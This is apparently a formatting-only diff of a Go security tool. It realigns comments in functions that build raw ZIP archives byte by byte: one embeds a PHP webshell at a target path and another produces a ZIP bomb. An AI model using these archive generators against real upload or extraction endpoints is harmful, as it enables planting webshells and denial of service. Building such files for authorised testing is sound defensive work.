@@ -213,10 +213,10 @@ func createZIPWithPHPWebshell(targetPath string) []byte {
 	fileContent := phpWebshell
 
 	// Local file header
-	localHeader := []byte{0x50, 0x4B, 0x03, 0x04} // Signature
-	localHeader = append(localHeader, []byte{0x14, 0x00}...) // Version needed
-	localHeader = append(localHeader, []byte{0x00, 0x00}...) // General purpose flag
-	localHeader = append(localHeader, []byte{0x00, 0x00}...) // Compression method (stored)
+	localHeader := []byte{0x50, 0x4B, 0x03, 0x04}                        // Signature
+	localHeader = append(localHeader, []byte{0x14, 0x00}...)             // Version needed
+	localHeader = append(localHeader, []byte{0x00, 0x00}...)             // General purpose flag
+	localHeader = append(localHeader, []byte{0x00, 0x00}...)             // Compression method (stored)
 	localHeader = append(localHeader, []byte{0x00, 0x00, 0x00, 0x00}...) // Mod time/date
 	crc32 := calculateCRC32(fileContent)
 	localHeader = append(localHeader, crc32...)
@@ -238,10 +238,10 @@ func createZIPWithPHPWebshell(targetPath string) []byte {
 	centralDir = append(centralDir, compressedSize...)
 	centralDir = append(centralDir, compressedSize...)
 	centralDir = append(centralDir, filenameLen...)
-	centralDir = append(centralDir, []byte{0x00, 0x00}...) // Extra field
-	centralDir = append(centralDir, []byte{0x00, 0x00}...) // Comment length
-	centralDir = append(centralDir, []byte{0x00, 0x00}...) // Disk number
-	centralDir = append(centralDir, []byte{0x00, 0x00}...) // Internal attributes
+	centralDir = append(centralDir, []byte{0x00, 0x00}...)             // Extra field
+	centralDir = append(centralDir, []byte{0x00, 0x00}...)             // Comment length
+	centralDir = append(centralDir, []byte{0x00, 0x00}...)             // Disk number
+	centralDir = append(centralDir, []byte{0x00, 0x00}...)             // Internal attributes
 	centralDir = append(centralDir, []byte{0x00, 0x00, 0x00, 0x00}...) // External attributes
 	offset := uint32ToBytes(0)
 	centralDir = append(centralDir, offset...)
@@ -273,16 +273,16 @@ func createZIPBomb(targetSize int) []byte {
 	zeros := bytes.Repeat([]byte{0}, targetSize)
 
 	zip := make([]byte, 0)
-	zip = append(zip, 0x50, 0x4B, 0x03, 0x04) // Signature
-	zip = append(zip, 0x14, 0x00) // Version
-	zip = append(zip, 0x00, 0x00) // Flags
-	zip = append(zip, 0x08, 0x00) // DEFLATE compression
-	zip = append(zip, 0x00, 0x00, 0x00, 0x00) // Time/date
-	zip = append(zip, 0x00, 0x00, 0x00, 0x00) // CRC32
+	zip = append(zip, 0x50, 0x4B, 0x03, 0x04)                            // Signature
+	zip = append(zip, 0x14, 0x00)                                        // Version
+	zip = append(zip, 0x00, 0x00)                                        // Flags
+	zip = append(zip, 0x08, 0x00)                                        // DEFLATE compression
+	zip = append(zip, 0x00, 0x00, 0x00, 0x00)                            // Time/date
+	zip = append(zip, 0x00, 0x00, 0x00, 0x00)                            // CRC32
 	zip = append(zip, byte(len(zeros)), byte(len(zeros)>>8), 0x00, 0x00) // Compressed
 	zip = append(zip, byte(targetSize), byte(targetSize>>8), 0x00, 0x00) // Uncompressed
-	zip = append(zip, 0x08, 0x00) // Filename length
-	zip = append(zip, 0x00, 0x00) // Extra
+	zip = append(zip, 0x08, 0x00)                                        // Filename length
+	zip = append(zip, 0x00, 0x00)                                        // Extra
 	zip = append(zip, []byte("zero.txt")...)
 	zip = append(zip, zeros...)
 
